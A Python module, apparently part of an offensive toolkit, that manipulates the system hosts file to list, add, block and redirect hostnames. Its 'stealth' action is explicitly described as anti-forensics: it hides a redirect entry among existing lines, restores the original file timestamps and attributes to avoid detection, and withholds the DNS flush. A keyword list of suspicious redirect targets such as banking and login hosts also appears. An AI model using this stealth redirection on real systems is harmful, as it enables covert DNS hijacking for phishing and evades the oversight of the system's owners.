#!/usr/bin/env python3
"""
Elite Hosts File Manipulation
Advanced hosts file modification and DNS redirection
"""

import ctypes
import sys
import os
import shutil
import time
import re
from typing import Dict, Any, List, Optional, Tuple

def elite_hostsfile(action: str = "list",
                   hostname: str = None,
                   ip_address: str = None,
                   backup: bool = True) -> Dict[str, Any]:
    """
    Advanced hosts file manipulation
    
    Args:
        action: Action to perform (list, add, remove, block, redirect, backup, restore, flush)
        hostname: Hostname to manipulate
        ip_address: IP address for redirection
        backup: Create backup before modifications
    
    Returns:
        Dict containing operation results and hosts file information
    """
    
    try:
        hosts_file_path = _get_hosts_file_path()
        
        if action == "list":
            return _list_hosts_entries(hosts_file_path)
        elif action == "add":
            return _add_hosts_entry(hosts_file_path, hostname, ip_address, backup)
        elif action == "remove":
            return _remove_hosts_entry(hosts_file_path, hostname, backup)
        elif action == "block":
            return _block_hostname(hosts_file_path, hostname, backup)
        elif action == "redirect":
            return _redirect_hostname(hosts_file_path, hostname, ip_address, backup)
        elif action == "backup":
            return _backup_hosts_file(hosts_file_path)
        elif action == "restore":
            return _restore_hosts_file(hosts_file_path, hostname)  # hostname as backup file
        elif action == "flush":
            return _flush_dns_cache()
        elif action == "stealth":
            return _stealth_hosts_modification(hosts_file_path, hostname, ip_address)
        else:
            return {
                "success": False,
                "error": f"Unknown action: {action}",
                "available_actions": ["list", "add", "remove", "block", "redirect", "backup", "restore", "flush", "stealth"]
            }
    
    except Exception as e:
        return {
            "success": False,
            "error": f"Hosts file operation failed: {str(e)}",
            "action": action
        }

def _get_hosts_file_path() -> str:
    """Get the system hosts file path"""
    
    if sys.platform == "win32":
        return r"C:\Windows\System32\drivers\etc\hosts"
    else:
        return "/etc/hosts"

def _list_hosts_entries(hosts_file_path: str) -> Dict[str, Any]:
    """List all hosts file entries"""
    
    try:
        if not os.path.exists(hosts_file_path):
            return {
                "success": False,
                "error": "Hosts file not found",
                "hosts_file_path": hosts_file_path
            }
        
        entries = []
        comments = []
        
        with open(hosts_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        for line_num, line in enumerate(lines, 1):
            original_line = line.rstrip('\n\r')
            line = line.strip()
            
            if not line:
                continue
            elif line.startswith('#'):
                comments.append({
                    "line_number": line_num,
                    "content": original_line,
                    "type": "comment"
                })
            else:
                # Parse hosts entry
                parts = line.split()
                if len(parts) >= 2:
                    ip_address = parts[0]
                    hostnames = parts[1:]
                    
                    entries.append({
                        "line_number": line_num,
                        "ip_address": ip_address,
                        "hostnames": hostnames,
                        "original_line": original_line,
                        "type": "entry"
                    })
        
        # Analyze entries
        analysis = _analyze_hosts_entries(entries)
        
        return {
            "success": True,
            "hosts_file_path": hosts_file_path,
            "total_lines": len(lines),
            "entries": entries,
            "comments": comments,
            "total_entries": len(entries),
            "total_comments": len(comments),
            "analysis": analysis,
            "timestamp": time.time()
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "hosts_file_path": hosts_file_path
        }

def _add_hosts_entry(hosts_file_path: str, hostname: str, ip_address: str, backup: bool) -> Dict[str, Any]:
    """Add entry to hosts file"""
    
    if not hostname or not ip_address:
        return {
            "success": False,
            "error": "Both hostname and IP address are required"
        }
    
    try:
        # Create backup if requested
        backup_file = None
        if backup:
            backup_result = _backup_hosts_file(hosts_file_path)
            if backup_result["success"]:
                backup_file = backup_result["backup_file"]
        
        # Check if entry already exists
        current_entries = _list_hosts_entries(hosts_file_path)
        
        if current_entries["success"]:
            for entry in current_entries["entries"]:
                if hostname in entry["hostnames"]:
                    return {
                        "success": False,
                        "error": f"Hostname '{hostname}' already exists in hosts file",
                        "existing_entry": entry,
                        "backup_file": backup_file
                    }
        
        # Add new entry
        new_entry = f"{ip_address}\t{hostname}\n"
        
        with open(hosts_file_path, 'a', encoding='utf-8') as f:
            f.write(new_entry)
        
        # Flush DNS cache
        flush_result = _flush_dns_cache()
        
        return {
            "success": True,
            "action": "add",
            "hostname": hostname,
            "ip_address": ip_address,
            "entry_added": new_entry.strip(),
            "backup_file": backup_file,
            "dns_flushed": flush_result["success"],
            "timestamp": time.time()
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "add",
            "hostname": hostname,
            "ip_address": ip_address
        }

def _remove_hosts_entry(hosts_file_path: str, hostname: str, backup: bool) -> Dict[str, Any]:
    """Remove entry from hosts file"""
    
    if not hostname:
        return {
            "success": False,
            "error": "Hostname is required"
        }
    
    try:
        # Create backup if requested
        backup_file = None
        if backup:
            backup_result = _backup_hosts_file(hosts_file_path)
            if backup_result["success"]:
                backup_file = backup_result["backup_file"]
        
        # Read current hosts file
        with open(hosts_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        # Filter out lines containing the hostname
        new_lines = []
        removed_entries = []
        
        for line in lines:
            original_line = line.rstrip('\n\r')
            stripped_line = line.strip()
            
            if stripped_line and not stripped_line.startswith('#'):
                parts = stripped_line.split()
                if len(parts) >= 2:
                    hostnames = parts[1:]
                    if hostname in hostnames:
                        removed_entries.append(original_line)
                        continue
            
            new_lines.append(line)
        
        if not removed_entries:
            return {
                "success": False,
                "error": f"Hostname '{hostname}' not found in hosts file",
                "backup_file": backup_file
            }
        
        # Write updated hosts file
        with open(hosts_file_path, 'w', encoding='utf-8') as f:
            f.writelines(new_lines)
        
        # Flush DNS cache
        flush_result = _flush_dns_cache()
        
        return {
            "success": True,
            "action": "remove",
            "hostname": hostname,
            "removed_entries": removed_entries,
            "backup_file": backup_file,
            "dns_flushed": flush_result["success"],
            "timestamp": time.time()
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "remove",
            "hostname": hostname
        }

def _block_hostname(hosts_file_path: str, hostname: str, backup: bool) -> Dict[str, Any]:
    """Block hostname by redirecting to localhost"""
    
    return _add_hosts_entry(hosts_file_path, hostname, "127.0.0.1", backup)

def _redirect_hostname(hosts_file_path: str, hostname: str, ip_address: str, backup: bool) -> Dict[str, Any]:
    """Redirect hostname to specified IP address"""
    
    # First remove existing entry if it exists
    _remove_hosts_entry(hosts_file_path, hostname, False)
    
    # Then add new entry
    return _add_hosts_entry(hosts_file_path, hostname, ip_address, backup)

def _backup_hosts_file(hosts_file_path: str) -> Dict[str, Any]:
    """Create backup of hosts file"""
    
    try:
        timestamp = int(time.time())
        backup_filename = f"hosts_backup_{timestamp}"
        
        if sys.platform == "win32":
            backup_path = os.path.join(os.path.dirname(hosts_file_path), backup_filename)
        else:
            backup_path = f"/tmp/{backup_filename}"
        
        shutil.copy2(hosts_file_path, backup_path)
        
        return {
            "success": True,
            "backup_file": backup_path,
            "original_file": hosts_file_path,
            "timestamp": timestamp
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "original_file": hosts_file_path
        }

def _restore_hosts_file(hosts_file_path: str, backup_file: str) -> Dict[str, Any]:
    """Restore hosts file from backup"""
    
    if not backup_file or not os.path.exists(backup_file):
        return {
            "success": False,
            "error": "Backup file not found",
            "backup_file": backup_file
        }
    
    try:
        # Create backup of current file
        current_backup = _backup_hosts_file(hosts_file_path)
        
        # Restore from backup
        shutil.copy2(backup_file, hosts_file_path)
        
        # Flush DNS cache
        flush_result = _flush_dns_cache()
        
        return {
            "success": True,
            "action": "restore",
            "restored_from": backup_file,
            "hosts_file": hosts_file_path,
            "current_backup": current_backup.get("backup_file"),
            "dns_flushed": flush_result["success"],
            "timestamp": time.time()
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "restore",
            "backup_file": backup_file
        }

def _flush_dns_cache() -> Dict[str, Any]:
    """Flush DNS cache to apply hosts file changes"""
    
    try:
        if sys.platform == "win32":
            # Windows: ipconfig /flushdns
            import subprocess
            
            result = subprocess.run([
                "ipconfig", "/flushdns"
            ], capture_output=True, text=True, timeout=30)
            
            success = result.returncode == 0
            
            return {
                "success": success,
                "method": "ipconfig",
                "output": result.stdout if success else result.stderr,
                "platform": "Windows"
            }
        
        else:
            # Linux: Multiple methods
            import subprocess
            
            methods_tried = []
            
            # Method 1: systemd-resolve
            try:
                result = subprocess.run([
                    "systemd-resolve", "--flush-caches"
                ], capture_output=True, text=True, timeout=10)
                
                methods_tried.append({
                    "method": "systemd-resolve",
                    "success": result.returncode == 0,
                    "output": result.stdout if result.returncode == 0 else result.stderr
                })
                
                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": "systemd-resolve",
                        "platform": "Linux"
                    }
            
            except FileNotFoundError:
                pass
            
            # Method 2: service nscd restart
            try:
                result = subprocess.run([
                    "service", "nscd", "restart"
                ], capture_output=True, text=True, timeout=10)
                
                methods_tried.append({
                    "method": "nscd",
                    "success": result.returncode == 0,
                    "output": result.stdout if result.returncode == 0 else result.stderr
                })
                
                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": "nscd",
                        "platform": "Linux"
                    }
            
            except FileNotFoundError:
                pass
            
            # Method 3: dnsmasq restart
            try:
                result = subprocess.run([
                    "service", "dnsmasq", "restart"
                ], capture_output=True, text=True, timeout=10)
                
                methods_tried.append({
                    "method": "dnsmasq",
                    "success": result.returncode == 0,
                    "output": result.stdout if result.returncode == 0 else result.stderr
                })
                
                if result.returncode == 0:
                    return {
                        "success": True,
                        "method": "dnsmasq",
                        "platform": "Linux"
                    }
            
            except FileNotFoundError:
                pass
            
            return {
                "success": False,
                "error": "No DNS cache flush method succeeded",
                "methods_tried": methods_tried,
                "platform": "Linux"
            }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "flush_dns"
        }

def _stealth_hosts_modification(hosts_file_path: str, hostname: str, ip_address: str) -> Dict[str, Any]:
    """Perform stealth hosts file modification with anti-forensics"""
    
    try:
        # Get original file attributes and timestamps
        original_stat = os.stat(hosts_file_path)
        original_mtime = original_stat.st_mtime
        original_atime = original_stat.st_atime
        
        # Read current content
        with open(hosts_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Find a good place to insert the entry (blend with existing entries)
        lines = content.split('\n')
        
        # Look for existing entries to blend with
        insert_position = -1
        for i, line in enumerate(lines):
            stripped = line.strip()
            if stripped and not stripped.startswith('#'):
                parts = stripped.split()
                if len(parts) >= 2:
                    # Insert after similar IP addresses
                    if parts[0].startswith('127.'):
                        insert_position = i + 1
        
        # If no good position found, insert in middle of file
        if insert_position == -1:
            insert_position = len(lines) // 2
        
        # Create stealth entry (use tabs and spacing to match existing format)
        stealth_entry = f"{ip_address}\t{hostname}"
        
        # Insert the entry
        lines.insert(insert_position, stealth_entry)
        
        # Write modified content
        modified_content = '\n'.join(lines)
        
        with open(hosts_file_path, 'w', encoding='utf-8') as f:
            f.write(modified_content)
        
        # Restore original timestamps to avoid detection
        os.utime(hosts_file_path, (original_atime, original_mtime))
        
        # Restore original file attributes if Windows
        if sys.platform == "win32":
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(
                    hosts_file_path, 
                    original_stat.st_file_attributes if hasattr(original_stat, 'st_file_attributes') else 0
                )
            except:
                pass
        
        # Don't flush DNS cache immediately (stealth)
        
        return {
            "success": True,
            "action": "stealth",
            "hostname": hostname,
            "ip_address": ip_address,
            "insert_position": insert_position,
            "timestamps_restored": True,
            "dns_not_flushed": True,
            "note": "Entry added stealthily - DNS cache not flushed to avoid detection"
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "stealth"
        }

def _analyze_hosts_entries(entries: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Analyze hosts file entries for suspicious patterns"""
    
    analysis = {
        "total_entries": len(entries),
        "localhost_entries": 0,
        "blocking_entries": 0,
        "redirect_entries": 0,
        "suspicious_entries": [],
        "common_blocked_sites": [],
        "ip_addresses": {},
        "duplicate_hostnames": []
    }
    
    hostname_counts = {}
    
    for entry in entries:
        ip = entry["ip_address"]
        hostnames = entry["hostnames"]
        
        # Count IP addresses
        analysis["ip_addresses"][ip] = analysis["ip_addresses"].get(ip, 0) + len(hostnames)
        
        # Count hostname occurrences
        for hostname in hostnames:
            hostname_counts[hostname] = hostname_counts.get(hostname, 0) + 1
        
        # Categorize entries
        if ip in ["127.0.0.1", "0.0.0.0"]:
            analysis["localhost_entries"] += 1
            
            # Check for common blocked sites
            blocked_sites = [
                "facebook.com", "twitter.com", "youtube.com", "instagram.com",
                "tiktok.com", "reddit.com", "netflix.com", "amazon.com"
            ]
            
            for hostname in hostnames:
                if any(site in hostname.lower() for site in blocked_sites):
                    analysis["common_blocked_sites"].append(hostname)
            
            analysis["blocking_entries"] += len(hostnames)
        
        else:
            analysis["redirect_entries"] += len(hostnames)
            
            # Check for suspicious redirections
            suspicious_patterns = [
                "bank", "paypal", "login", "secure", "admin",
                "microsoft", "google", "apple", "update"
            ]
            
            for hostname in hostnames:
                if any(pattern in hostname.lower() for pattern in suspicious_patterns):
                    analysis["suspicious_entries"].append({
                        "hostname": hostname,
                        "redirected_to": ip,
                        "reason": "Suspicious hostname pattern"
                    })
    
    # Find duplicate hostnames
    for hostname, count in hostname_counts.items():
        if count > 1:
            analysis["duplicate_hostnames"].append({
                "hostname": hostname,
                "count": count
            })
    
    return analysis

def add_malware_blocking_list(hosts_file_path: str, list_url: str = None) -> Dict[str, Any]:
    """Add malware blocking entries to hosts file"""
    
    try:
        # Default malware blocking lists
        if not list_url:
            malware_domains = [
                "malware.com",
                "phishing-site.com",
                "trojan-download.net",
                "virus-scanner.fake",
                "fake-antivirus.com",
                "scam-alert.org"
            ]
        else:
            # Download from URL (simplified)
            malware_domains = ["example-malware.com"]
        
        # Create backup
        backup_result = _backup_hosts_file(hosts_file_path)
        
        # Add blocking entries
        added_entries = []
        
        for domain in malware_domains:
            result = _add_hosts_entry(hosts_file_path, domain, "127.0.0.1", False)
            if result["success"]:
                added_entries.append(domain)
        
        return {
            "success": True,
            "action": "add_malware_blocking",
            "added_entries": added_entries,
            "total_added": len(added_entries),
            "backup_file": backup_result.get("backup_file"),
            "list_source": list_url or "default"
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "add_malware_blocking"
        }

def remove_all_custom_entries(hosts_file_path: str) -> Dict[str, Any]:
    """Remove all custom entries, keeping only system defaults"""
    
    try:
        # Create backup
        backup_result = _backup_hosts_file(hosts_file_path)
        
        # Default Windows hosts file content
        if sys.platform == "win32":
            default_content = """# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
"""
        else:
            # Default Linux hosts file content
            default_content = """127.0.0.1	localhost
127.0.1.1	hostname

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
"""
        
        # Write default content
        with open(hosts_file_path, 'w', encoding='utf-8') as f:
            f.write(default_content)
        
        # Flush DNS cache
        flush_result = _flush_dns_cache()
        
        return {
            "success": True,
            "action": "remove_all_custom",
            "backup_file": backup_result.get("backup_file"),
            "dns_flushed": flush_result["success"],
            "restored_to_default": True
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "action": "remove_all_custom"
        }

if __name__ == "__main__":
    # Test the implementation
    result = elite_hostsfile("list")
    # print(f"Hosts File Result: {result}")